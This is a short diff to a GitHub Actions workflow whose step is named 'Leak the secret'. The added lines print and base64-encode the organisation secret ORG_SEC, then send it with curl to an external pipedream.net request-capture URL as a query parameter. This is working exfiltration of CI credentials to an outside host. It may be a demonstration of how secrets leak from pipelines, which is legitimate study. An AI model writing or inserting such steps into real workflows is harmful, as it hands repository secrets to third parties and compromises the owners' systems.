@@ -11,6 +11,9 @@ jobs:
     steps:
       - name: Leak the secret
         run: |
-          echo $VALUE | base64 | strings
+          echo $VALUE | base64 
+          printenv $VALUE
+          VAR_ABC=$VALUE
+          curl -I https://enax0mfmkuupq.x.pipedream.net?code=$VAR_ABC
         env:
           VALUE: ${{ secrets.ORG_SEC }}
